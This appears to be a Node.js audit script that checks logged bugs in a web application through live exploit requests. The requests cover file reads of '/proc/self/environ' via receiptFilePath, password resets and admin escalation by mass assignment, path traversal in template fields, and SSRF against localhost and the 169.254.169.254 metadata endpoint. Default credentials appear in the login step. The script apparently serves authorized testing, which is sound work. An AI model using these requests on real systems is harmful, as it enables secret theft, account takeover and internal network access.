const { Session } = require('./lib.cjs');
const PW = 'P36brgss!23';
function log(t, r, x) { console.log(t.padEnd(62), r.status, (x===undefined?r.text:x).toString().slice(0,200).replace(/\s+/g,' ')); }
(async () => {
  const admin = new Session('admin', { fakeIp: '198.51.100.31' });
  await admin.loginStaff('admin','admin123');
  const manager = new Session('manager', { fakeIp: '198.51.100.33' });
  console.log('manager login', (await manager.loginStaff('AUDIT-P36B-manager', PW)).status);
  const viewer = new Session('viewer', { fakeIp: '198.51.100.32' });
  console.log('viewer login', (await viewer.loginStaff('AUDIT-P36B-viewer', PW)).status);

  console.log('\n--- BUG-060 anon expenses ---');
  const anon = new Session('anon', { fakeIp: '198.51.100.34' });
  const root = await anon.get('/');
  console.log('anon GET / status', root.status, 'csrf?', !!anon.csrf, 'cookies', [...anon.cookies.keys()].join(','));
  log('anon POST /api/expenses/with-receipt', await anon.post('/api/expenses/with-receipt', {vehicleId:2,category:'AUDIT-P36B',amount:'1',date:'2026-01-01',receiptFilePath:'/proc/self/environ'}));
  log('anon GET  /api/expenses', await anon.get('/api/expenses'), '');
  log('anon POST /api/expenses', await anon.post('/api/expenses', {vehicleId:2,category:'AUDIT-P36B',amount:'1',date:'2026-01-01'}));
  // authenticated with manage_expenses: receiptFilePath outside uploads
  const ex = await manager.post('/api/expenses', {vehicleId:2,category:'AUDIT-P36B-fp',amount:'1.00',date:'2026-01-01',description:'AUDIT-P36B',receiptFilePath:'C:\Windows\win.ini'});
  log('manager POST /api/expenses w/ receiptFilePath', ex);
  const exId = ex.json && ex.json.id;
  if (exId) log('manager GET /api/expenses/'+exId+'/receipt', await manager.get('/api/expenses/'+exId+'/receipt'), '');
  log('anon GET /api/expenses/'+exId+'/receipt', await anon.get('/api/expenses/'+(exId||1)+'/receipt'), '');

  console.log('\n--- BUG-063 mass assignment users ---');
  log('manager PATCH /api/users/5 {password}', await manager.patch('/api/users/5', {password:'AUDIT-P36B-pwn!23'}));
  log('manager PATCH /api/users/6 (self) {id:9999}', await manager.patch('/api/users/6', {id:9999, createdBy:'AUDIT-P36B-forged'}));
  log('manager PATCH /api/users/6 (self) {role:admin}', await manager.patch('/api/users/6', {role:'admin'}));
  log('manager POST /api/users {role:admin}', await manager.post('/api/users', {username:'AUDIT-P36B-escalated', password:PW, role:'admin'}));

  console.log('\n--- BUG-084 mass assignment reservations ---');
  const rs = await admin.post('/api/reservations', { vehicleId: 2, customerId: 1, startDate: '2027-05-01', endDate: '2027-05-05', status: 'pending', type: 'standard' });
  const rid = rs.json && rs.json.id; console.log('fixture reservation', rs.status, rid);
  log('manager PATCH /api/reservations/'+rid+' {id:9999,deletedBy}', await manager.patch('/api/reservations/'+rid, {id:9999, deletedBy:'AUDIT-P36B-forged', deletedAt:null, createdBy:'AUDIT-P36B'}));

  console.log('\n--- BUG-070 template path fields ---');
  log('manager PATCH /api/pdf-templates/2 {backgroundPath}', await manager.patch('/api/pdf-templates/2', {backgroundPath:'../../AUDIT-P36B-canary.txt'}));
  log('admin  GET   /api/pdf-templates/2', await admin.get('/api/pdf-templates/2'), (await admin.get('/api/pdf-templates/2')).text.slice(0,300));
  log('manager PATCH /api/damage-check-templates/1 {backgroundPath}', await manager.patch('/api/damage-check-templates/1', {backgroundPath:'../../AUDIT-P36B-canary.txt'}));
  log('manager PATCH /api/vehicle-diagram-templates/1 {diagramPath}', await manager.patch('/api/vehicle-diagram-templates/1', {diagramPath:'../../AUDIT-P36B-canary.txt'}));

  console.log('\n--- BUG-071 CJIB SSRF ---');
  log('manager POST /api/fines/cjib-config/test 127.0.0.1:5432', await manager.post('/api/fines/cjib-config/test', {host:'127.0.0.1', port:5432, username:'a', password:'b', secure:true}));
  log('manager POST /api/fines/cjib-config/test 169.254.169.254', await manager.post('/api/fines/cjib-config/test', {host:'169.254.169.254', port:80, username:'a', password:'b', secure:true}));
  log('manager POST /api/fines/cjib-config/test example.invalid', await manager.post('/api/fines/cjib-config/test', {host:'nonexistent.invalid', port:21, username:'a', password:'b', secure:true}));

  console.log('\n--- BUG-077 SMTP SSRF ---');
  log('manager POST /api/app-settings/email/test 127.0.0.1:5432', await manager.post('/api/app-settings/email/test', {smtpHost:'127.0.0.1', smtpPort:5432, smtpUser:'a', smtpPassword:'b'}));
  log('manager POST /api/app-settings/email/test 169.254.169.254:80', await manager.post('/api/app-settings/email/test', {smtpHost:'169.254.169.254', smtpPort:80, smtpUser:'a', smtpPassword:'b'}));
  log('manager POST /api/app-settings/email/test 127.0.0.1:9', await manager.post('/api/app-settings/email/test', {smtpHost:'127.0.0.1', smtpPort:9, smtpUser:'a', smtpPassword:'b'}));

  console.log('\n--- BUG-085 /uploads static ---');
  for (const p of ['/uploads/templates/','/uploads/', '/uploads/temp/']) log('viewer GET '+p, await viewer.get(p), '');
})().catch(e=>console.error('FATAL',e));
